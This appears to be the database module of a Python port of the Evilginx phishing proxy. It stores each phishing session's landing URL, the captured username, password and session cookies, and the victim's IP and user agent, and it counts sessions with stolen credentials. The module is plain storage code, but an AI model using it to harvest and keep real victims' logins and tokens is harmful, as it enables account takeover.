#!/usr/bin/env python3
"""
Evilginx Python Conversion - Database Module
Converted from Go to Python
"""

import os
import json
import time
from typing import Dict, List, Optional, Any


class Token:
    def __init__(self, name: str = "", value: str = "", path: str = "", http_only: bool = False):
        self.name = name
        self.value = value
        self.path = path
        self.http_only = http_only
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'name': self.name,
            'value': self.value,
            'path': self.path,
            'http_only': self.http_only
        }
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'Token':
        return cls(
            name=data.get('name', ''),
            value=data.get('value', ''),
            path=data.get('path', ''),
            http_only=data.get('http_only', False)
        )


class Session:
    def __init__(self, id: int = 0, phishlet: str = "", landing_url: str = "",
                 username: str = "", password: str = "", custom: Optional[Dict[str, str]] = None,
                 tokens: Optional[Dict[str, Dict[str, Token]]] = None, session_id: str = "",
                 user_agent: str = "", remote_addr: str = "", create_time: int = 0, update_time: int = 0):
        self.id = id
        self.phishlet = phishlet
        self.landing_url = landing_url
        self.username = username
        self.password = password
        self.custom = custom or {}
        self.tokens = tokens or {}
        self.session_id = session_id
        self.user_agent = user_agent
        self.remote_addr = remote_addr
        self.create_time = create_time
        self.update_time = update_time
    
    def to_dict(self) -> Dict[str, Any]:
        tokens_dict = {}
        for domain, token_map in self.tokens.items():
            tokens_dict[domain] = {k: v.to_dict() for k, v in token_map.items()}
        
        return {
            'id': self.id,
            'phishlet': self.phishlet,
            'landing_url': self.landing_url,
            'username': self.username,
            'password': self.password,
            'custom': self.custom,
            'tokens': tokens_dict,
            'session_id': self.session_id,
            'useragent': self.user_agent,
            'remote_addr': self.remote_addr,
            'create_time': self.create_time,
            'update_time': self.update_time
        }
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'Session':
        tokens_dict = {}
        tokens_data = data.get('tokens', {})
        for domain, token_map in tokens_data.items():
            tokens_dict[domain] = {k: Token.from_dict(v) for k, v in token_map.items()}
        
        return cls(
            id=data.get('id', 0),
            phishlet=data.get('phishlet', ''),
            landing_url=data.get('landing_url', ''),
            username=data.get('username', ''),
            password=data.get('password', ''),
            custom=data.get('custom', {}),
            tokens=tokens_dict,
            session_id=data.get('session_id', ''),
            user_agent=data.get('useragent', ''),
            remote_addr=data.get('remote_addr', ''),
            create_time=data.get('create_time', 0),
            update_time=data.get('update_time', 0)
        )


class Database:
    def __init__(self, path: str):
        self.path = path
        self.sessions: Dict[int, Session] = {}
        self.next_id = 1
        self._load()
    
    def _load(self):
        """Load database from file"""
        if os.path.exists(self.path):
            try:
                with open(self.path, 'r') as f:
                    data = json.load(f)
                    self.sessions = {int(k): Session.from_dict(v) for k, v in data.get('sessions', {}).items()}
                    self.next_id = data.get('next_id', 1)
            except Exception as e:
                print(f"Warning: Could not load database: {e}")
                self.sessions = {}
                self.next_id = 1
    
    def _save(self):
        """Save database to file"""
        try:
            os.makedirs(os.path.dirname(self.path) if os.path.dirname(self.path) else '.', exist_ok=True)
            data = {
                'sessions': {str(k): v.to_dict() for k, v in self.sessions.items()},
                'next_id': self.next_id
            }
            with open(self.path, 'w') as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            print(f"Error saving database: {e}")
    
    def create_session(self, sid: str, phishlet: str, landing_url: str, 
                      user_agent: str, remote_addr: str) -> Optional[Session]:
        """Create a new session"""
        # Check if session already exists
        for s in self.sessions.values():
            if s.session_id == sid:
                return None
        
        session_id = self.next_id
        self.next_id += 1
        
        session = Session(
            id=session_id,
            phishlet=phishlet,
            landing_url=landing_url,
            username="",
            password="",
            custom={},
            tokens={},
            session_id=sid,
            user_agent=user_agent,
            remote_addr=remote_addr,
            create_time=int(time.time()),
            update_time=int(time.time())
        )
        
        self.sessions[session_id] = session
        self._save()
        return session
    
    def list_sessions(self) -> List[Session]:
        """List all sessions"""
        return sorted(self.sessions.values(), key=lambda s: s.id)
    
    def get_session_by_id(self, session_id: int) -> Optional[Session]:
        """Get session by ID"""
        return self.sessions.get(session_id)
    
    def get_session_by_sid(self, sid: str) -> Optional[Session]:
        """Get session by session ID string"""
        for session in self.sessions.values():
            if session.session_id == sid:
                return session
        return None
    
    def set_session_username(self, sid: str, username: str) -> bool:
        """Update session username"""
        session = self.get_session_by_sid(sid)
        if session:
            session.username = username
            session.update_time = int(time.time())
            self._save()
            return True
        return False
    
    def set_session_password(self, sid: str, password: str) -> bool:
        """Update session password"""
        session = self.get_session_by_sid(sid)
        if session:
            session.password = password
            session.update_time = int(time.time())
            self._save()
            return True
        return False
    
    def set_session_custom(self, sid: str, name: str, value: str) -> bool:
        """Update session custom field"""
        session = self.get_session_by_sid(sid)
        if session:
            session.custom[name] = value
            session.update_time = int(time.time())
            self._save()
            return True
        return False
    
    def set_session_tokens(self, sid: str, tokens: Dict[str, Dict[str, Token]]) -> bool:
        """Update session tokens"""
        session = self.get_session_by_sid(sid)
        if session:
            session.tokens = tokens
            session.update_time = int(time.time())
            self._save()
            return True
        return False
    
    def delete_session(self, sid: str) -> bool:
        """Delete session by session ID"""
        session = self.get_session_by_sid(sid)
        if session:
            del self.sessions[session.id]
            self._save()
            return True
        return False
    
    def delete_session_by_id(self, session_id: int) -> bool:
        """Delete session by ID"""
        if session_id in self.sessions:
            del self.sessions[session_id]
            self._save()
            return True
        return False
    
    def flush(self):
        """Flush database (force save)"""
        self._save()
    
    def get_stats(self) -> Dict[str, Any]:
        """Get database statistics"""
        total_sessions = len(self.sessions)
        sessions_with_credentials = sum(1 for s in self.sessions.values() if s.username or s.password)
        
        return {
            'total_sessions': total_sessions,
            'sessions_with_credentials': sessions_with_credentials,
            'database_path': self.path
        }
